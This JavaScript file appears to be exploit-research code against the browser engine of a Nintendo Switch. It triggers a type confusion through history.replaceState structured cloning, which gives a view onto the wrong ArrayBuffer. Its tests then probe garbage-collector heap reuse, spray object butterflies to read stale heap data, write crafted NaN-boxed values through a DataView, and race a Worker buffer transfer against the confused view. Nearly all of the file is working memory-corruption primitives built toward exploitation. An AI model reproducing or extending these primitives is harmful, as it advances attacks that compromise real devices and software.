// GC heap reuse probe v2 — lightweight, won't OOM the Switch
// Tests whether freed ArrayBuffer data regions get reused by object butterflies,
// and whether confused views can read stale/reused heap data.
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

function hexDump(view, off, len) {
  var h = '';
  for (var i = off; i < Math.min(off + len, view.length); i++)
    h += view[i].toString(16).padStart(2, '0');
  return h;
}

// Gentle GC trigger — allocate+free in waves, avoid huge single allocs
function nudgeGC(rounds) {
  for (var r = 0; r < (rounds || 3); r++) {
    var tmp = [];
    for (var i = 0; i < 50; i++) tmp.push(new ArrayBuffer(4096));
    tmp = null;
    // Create string pressure too (different GC space)
    var s = '';
    for (var i = 0; i < 500; i++) s += 'x'.repeat(100);
    s = null;
  }
}

// ─── Test 1: Can we detect GC via FinalizationRegistry at all? ───
test('fr_detection', function() {
  var collected = 0;
  var fr = new FinalizationRegistry(function() { collected++; });

  for (var i = 0; i < 20; i++) {
    fr.register({}, i);
  }
  // Objects go out of scope immediately

  nudgeGC(5);

  // FR callbacks are async — they won't fire synchronously
  // But let's check if any fired
  return { result: 'fr_registered', collectedSync: collected };
});

// ─── Test 2: Check if new ArrayBuffers contain residual data ───
test('residual_check', function() {
  var SIZE = 64;

  // Fill and free buffers
  for (var round = 0; round < 3; round++) {
    var bufs = [];
    for (var i = 0; i < 100; i++) {
      var b = new ArrayBuffer(SIZE);
      new Uint8Array(b).fill(0xDE);
      bufs.push(b);
    }
    bufs = null;
    nudgeGC(1);
  }

  // Check new allocations for stale data
  var stale = [];
  for (var i = 0; i < 50; i++) {
    var nb = new ArrayBuffer(SIZE);
    var nv = new Uint8Array(nb);
    var nonZero = 0;
    for (var j = 0; j < nv.length; j++) if (nv[j] !== 0) nonZero++;
    if (nonZero > 0 && stale.length < 3) {
      stale.push({ idx: i, nz: nonZero, hex: hexDump(nv, 0, 16) });
    }
  }

  return {
    result: stale.length > 0 ? 'STALE_DATA' : 'clean',
    samples: stale
  };
});

// ─── Test 3: Confused view survives GC ───
test('confused_gc', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xCC);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xDD);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  var filler = [1n, target, v1, v2];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][3];
  if (!(cv instanceof Uint8Array) || cv[0] !== 0xCC) return { result: 'no_confusion' };

  var before = hexDump(cv, 0, 8);

  // Keep only cv, drop everything else
  var keepBuf = cv.buffer;
  c = null; filler = null; outer = null; target = null; source = null;

  nudgeGC(5);

  var after = hexDump(cv, 0, 8);

  return {
    result: before === after ? 'survived_intact' : 'DATA_CHANGED',
    before: before,
    after: after,
    bufAlive: keepBuf.byteLength === 64
  };
});

// ─── Test 4: Async GC + FR callback with butterfly spray ───
// Returns a Promise — the debug server handles this via eval result
test('fr_butterfly_async', function() {
  return new Promise(function(resolve) {
    var BUF_SIZE = 48; // Match butterfly size for 6 properties
    var SPRAY = 100;

    // Create and register buffers with FR
    var fr = new FinalizationRegistry(function(tag) {
      // GC ran! Now spray objects with butterflies
      var objs = [];
      for (var i = 0; i < 200; i++) {
        var o = {};
        o.p0 = { leak: true };
        o.p1 = { leak: true };
        o.p2 = 3.14159;
        o.p3 = 2.71828;
        o.p4 = { leak: true };
        o.p5 = 1.41421;
        objs.push(o);
      }

      // Now allocate new buffers and check for residue
      var found = [];
      for (var i = 0; i < 50; i++) {
        var nb = new ArrayBuffer(BUF_SIZE);
        var f64 = new Float64Array(nb);
        for (var j = 0; j < f64.length; j++) {
          if (f64[j] !== 0) {
            found.push({ bufIdx: i, slot: j, hex: f64ToHex(f64[j]) });
            break;
          }
        }
        if (found.length >= 5) break;
      }

      resolve({
        result: found.length > 0 ? 'RESIDUE_IN_CALLBACK' : 'clean_in_callback',
        found: found,
        tag: tag
      });
    });

    // Spray buffers with marker data, register with FR
    var bufs = [];
    for (var i = 0; i < SPRAY; i++) {
      var b = new ArrayBuffer(BUF_SIZE);
      new Uint8Array(b).fill(0xEE);
      fr.register(b, 'buf_' + i);
      bufs.push(b);
    }

    // Drop references
    bufs = null;

    // Gentle GC pressure
    nudgeGC(5);

    // Timeout fallback
    setTimeout(function() {
      // Try more GC pressure
      nudgeGC(5);
      setTimeout(function() {
        resolve({ result: 'timeout_no_fr_callback' });
      }, 1000);
    }, 2000);
  });
});

// ─── Test 5: Size class matching — free buffers, allocate objects, check new buffers ───
test('size_class_reuse', function() {
  var SIZE = 64;

  // Phase 1: Spray buffers with marker
  var marked = [];
  for (var i = 0; i < 80; i++) {
    var b = new ArrayBuffer(SIZE);
    new Uint8Array(b).fill(0xBE);
    marked.push(b);
  }

  // Phase 2: Free them
  marked = null;
  nudgeGC(3);

  // Phase 3: Allocate objects with properties (~64 bytes butterfly)
  var objs = [];
  for (var i = 0; i < 200; i++) {
    var o = {};
    o.a = { x: 1 };  // tagged pointer
    o.b = { x: 2 };  // tagged pointer
    o.c = 1.1;        // double
    o.d = 2.2;        // double
    o.e = { x: 3 };   // tagged pointer
    o.f = { x: 4 };   // tagged pointer
    o.g = 3.3;        // double
    o.h = 4.4;        // double
    objs.push(o);
  }

  // Phase 4: Allocate fresh buffers, check for object data
  var found = [];
  for (var i = 0; i < 100; i++) {
    var nb = new ArrayBuffer(SIZE);
    var f64 = new Float64Array(nb);
    var u8 = new Uint8Array(nb);
    var interesting = false;

    for (var j = 0; j < f64.length; j++) {
      var v = f64[j];
      if (v !== 0 && !isNaN(v)) {
        interesting = true;
        break;
      }
    }

    // Also check for NaN-boxed values (tagged pointers have NaN bit patterns)
    for (var j = 0; j < f64.length; j++) {
      if (isNaN(f64[j]) && u8[j*8+7] !== 0) {
        interesting = true;
        break;
      }
    }

    if (interesting && found.length < 5) {
      var vals = [];
      for (var j = 0; j < f64.length; j++) vals.push(f64ToHex(f64[j]));
      found.push({ idx: i, vals: vals, raw: hexDump(u8, 0, 32) });
    }
  }

  return {
    result: found.length > 0 ? 'OBJECT_RESIDUE' : 'clean',
    found: found
  };
});

// ─── Test 6: Direct overlap — confused view reads from a buffer whose ───
// data region was freed and reallocated as butterfly storage
test('confused_overlap', function() {
  // Step 1: Create a "victim" buffer and get a confused view to it
  var victim = new ArrayBuffer(64);
  var vv = new Uint8Array(victim);
  vv.fill(0x41); // 'A' marker

  var src = new ArrayBuffer(64);
  new Uint8Array(src).fill(0x42);
  var s1 = new Uint8Array(src);
  var s2 = new Uint8Array(src);

  var filler = [1n, victim, s1, s2];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][3]; // confused view → victim buffer
  if (!(cv instanceof Uint8Array) || cv[0] !== 0x41) return { result: 'no_confusion', byte0: cv ? cv[0] : -1 };

  // cv.buffer === c[0][1] (the cloned victim buffer)
  // Both keep the buffer alive — we can't free it while cv exists
  // BUT: what if we use the WRITE ability to corrupt the buffer's OWN metadata?

  // Step 2: Write through cv to check we have write access
  cv[0] = 0xFF;
  var directView = new Uint8Array(c[0][1]);
  var writeWorks = directView[0] === 0xFF;
  cv[0] = 0x41; // restore

  // Step 3: Can we create a Float64Array view to read as doubles?
  var f64 = new Float64Array(cv.buffer);
  var f64vals = [];
  for (var i = 0; i < f64.length; i++) f64vals.push(f64ToHex(f64[i]));

  // Step 4: Attempt to place an OBJECT reference into the buffer
  // We can't directly put a JS object into ArrayBuffer data.
  // But what if we abuse DataView to write a crafted double that the engine
  // might interpret as a tagged value?
  // In JSC NaN-boxing (64-bit): object pointer = 0x0000_XXXX_XXXX_XXXX
  // Double NaN = 0x7FF8_0000_0000_0000
  // Integer = 0xFFFF_0000_XXXX_XXXX

  // Write a value that would be interpreted as integer 0x41414141 if NaN-boxed
  var dv = new DataView(cv.buffer);
  dv.setUint32(0, 0x41414141, true); // low 32
  dv.setUint32(4, 0xFFFF0000, true); // high 32 (integer tag)

  var readBack = f64[0];
  var readHex = f64ToHex(readBack);

  return {
    result: 'write_test',
    writeWorks: writeWorks,
    f64vals: f64vals,
    craftedHex: readHex,
    craftedIsNaN: isNaN(readBack)
  };
});

// ─── Test 7: WeakRef lifecycle tracking ───
test('weakref_lifecycle', function() {
  // Create objects, track with WeakRef, see when they die
  var refs = [];
  for (var i = 0; i < 20; i++) {
    var obj = { idx: i, data: new Array(8).fill(i) };
    refs.push(new WeakRef(obj));
  }
  // obj references go out of scope

  // GC pressure
  nudgeGC(5);

  var alive = 0, dead = 0;
  for (var i = 0; i < refs.length; i++) {
    if (refs[i].deref() !== undefined) alive++;
    else dead++;
  }

  // More pressure
  nudgeGC(5);

  var alive2 = 0, dead2 = 0;
  for (var i = 0; i < refs.length; i++) {
    if (refs[i].deref() !== undefined) alive2++;
    else dead2++;
  }

  return {
    result: dead > 0 || dead2 > 0 ? 'GC_ACTIVE' : 'no_collection',
    round1: { alive: alive, dead: dead },
    round2: { alive: alive2, dead: dead2 }
  };
});

// ─── Test 8: Confused view + Worker transfer race ───
test('worker_transfer', function() {
  if (typeof Worker === 'undefined') return { result: 'no_workers' };

  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xAA);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xBB);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  var filler = [1n, target, v1, v2];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][3];
  if (!(cv instanceof Uint8Array) || cv[0] !== 0xAA) return { result: 'no_confusion' };

  // Transfer cv's underlying buffer to a Worker
  // The Worker blob just acknowledges receipt
  var blob = new Blob([
    'self.onmessage=function(e){self.postMessage({got:e.data.byteLength||"no buf"});}'
  ], { type: 'application/javascript' });

  try {
    var w = new Worker(URL.createObjectURL(blob));
    var bufToTransfer = cv.buffer;
    var beforeTransfer = cv[0];
    var beforeLen = cv.byteLength;

    // Transfer the buffer
    w.postMessage(bufToTransfer, [bufToTransfer]);

    // Check cv after transfer
    var afterLen = -1;
    var afterByte = -1;
    var afterBufLen = -1;
    try { afterLen = cv.byteLength; } catch(e) { afterLen = 'err:' + e.message.substring(0, 30); }
    try { afterByte = cv[0]; } catch(e) { afterByte = 'err:' + e.message.substring(0, 30); }
    try { afterBufLen = cv.buffer.byteLength; } catch(e) { afterBufLen = 'err:' + e.message.substring(0, 30); }

    w.terminate();

    return {
      result: 'transfer_test',
      beforeByte: beforeTransfer,
      beforeLen: beforeLen,
      afterByte: afterByte,
      afterLen: afterLen,
      afterBufLen: afterBufLen,
      detached: afterBufLen === 0 || afterLen === 0
    };
  } catch(e) {
    return { result: 'worker_error', msg: e.message.substring(0, 80) };
  }
});

return JSON.stringify(results);
})();
